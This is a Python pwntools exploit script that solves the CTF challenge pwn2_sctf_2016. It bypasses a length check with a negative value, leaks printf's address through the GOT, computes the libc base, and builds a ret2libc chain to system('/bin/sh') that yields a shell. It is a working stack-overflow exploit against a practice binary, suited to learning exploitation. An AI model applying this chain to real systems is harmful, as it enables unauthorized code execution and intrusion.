from pwn import *

r = remote('node5.buuoj.cn', 28194)
elf = ELF(r'../pwn_file/pwn2_sctf_2016')
libc = ELF(r'libc/libc-2.23_32.so')

context.log_level = 'debug'

main_addr = elf.sym['main']
vul_addr = elf.sym['vuln']  # 0x804852F
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
# printf_addr = elf.sym['printf']
printf_str = 0x80486F8  # "You said: %s\n"

r.sendlineafter(b'me to read? ', b'-1')
# 通过printf函数泄漏printf的地址
payload = b'A' * (0x2c + 4) + p32(printf_plt) + p32(main_addr) + p32(printf_str) + p32(printf_got)
r.sendlineafter(b'of data!\n', payload)
# r.recvline()
r.recvuntil(b'said: ')  # #这是程序正常输出的
r.recvuntil(b'said: ')  # printf的第一个参数
printf_addr = u32(r.recv(4))  # 0xf7e39020
print(hex(printf_addr))

base_addr = printf_addr - libc.sym['printf']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

r.sendlineafter(b'me to read? ', b'-1')
payload2 = b'A' * (0x2c + 4) + p32(system_addr) + p32(main_addr) + p32(sh_addr)
r.sendlineafter(b'of data!\n', payload2)
r.interactive()
